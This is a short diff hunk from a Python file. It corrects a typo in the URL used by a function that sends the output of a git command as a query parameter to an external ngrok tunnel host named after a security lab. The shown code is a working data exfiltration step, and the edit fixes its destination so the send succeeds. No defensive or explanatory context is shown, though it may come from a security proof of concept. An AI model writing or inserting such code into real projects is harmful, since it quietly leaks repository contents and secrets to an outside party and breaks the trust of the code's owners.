@@ -38,7 +38,7 @@ def send_data_to_server(data):
         print("Cannot send data because 'requests' library is not available.")
         return
 
-    url = "https://noomasec-labs.ngrok.app/data"
+    url = "https://nomasec-labs.ngrok.app/data"
     params = {"content_from_git_command": data}
     try:
         response = requests.get(url, params=params)
